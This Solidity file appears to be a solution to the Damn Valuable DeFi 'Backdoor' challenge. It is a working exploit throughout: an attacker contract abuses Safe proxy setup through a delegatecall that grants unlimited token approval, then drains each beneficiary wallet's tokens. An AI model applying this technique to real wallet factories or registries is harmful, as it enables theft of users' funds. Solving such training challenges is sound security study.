// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

// An attacker contract that will approve tokens on behalf of the Safe Wallet (SafeProxy)
contract ApproveAttacker {
    // this function will be called via delegateCall so msg.sender will persist
    function approveTokens(
        DamnValuableToken _token,
        address _spender
    ) external {
        // approve BackdoorAttacker to use all of Safe Wallet tokens
        _token.approve(_spender, type(uint256).max);
    }
}

contract BackdoorAttacker {
    uint256 private constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    SafeProxyFactory private factory;
    Safe private singletonCopy;
    DamnValuableToken private token;
    WalletRegistry private walletRegistry;
    address[] private users;
    address private recovery;

    ApproveAttacker private approveAttacker;

    constructor(
        SafeProxyFactory _factory,
        Safe _singletonCopy,
        DamnValuableToken _token,
        WalletRegistry _walletRegistry,
        address[] memory _users,
        address _recovery
    ) {
        factory = _factory;
        singletonCopy = _singletonCopy;
        token = _token;
        walletRegistry = _walletRegistry;
        users = _users;
        recovery = _recovery;
        approveAttacker = new ApproveAttacker();
    }

    function attack() external {
        // the attack path is => 1. attack() -> 2. createProxyWithCallback (for each beneficiary user)
        // -> 3. setup() (SaFe.sol) -> 4. delegateCall to = ApproveAttacker, data = approveTokens(dvt, BackdoorAttacker)
        // -> 5. proxyCreated() -> 6. the proxy created will be called 4 times transfering dvt to safeProxy
        // -> 6. transfer dvt from safeProxy to BackdoorAttacker -> 7. transfer all dvt to recovery

        for (uint256 user = 0; user < users.length; user++) {
            address[] memory owners = new address[](1);
            owners[0] = users[user];

            address approveAttackerAddress = address(approveAttacker);
            bytes memory approveAttackerCalldata = abi.encodeWithSelector(
                approveAttacker.approveTokens.selector,
                token,
                address(this)
            );

            bytes memory initializerSetUpCalldata = abi.encodeWithSelector(
                singletonCopy.setup.selector,
                owners,
                1,
                approveAttackerAddress,
                approveAttackerCalldata,
                address(0),
                address(0),
                uint256(0),
                payable(address(0))
            );

            SafeProxy safeProxy = factory.createProxyWithCallback(
                address(singletonCopy),
                initializerSetUpCalldata,
                1,
                walletRegistry
            );

            token.transferFrom(
                address(safeProxy),
                address(this),
                token.balanceOf(address(safeProxy))
            );
        }

        token.transfer(recovery, AMOUNT_TOKENS_DISTRIBUTED);
    }
}
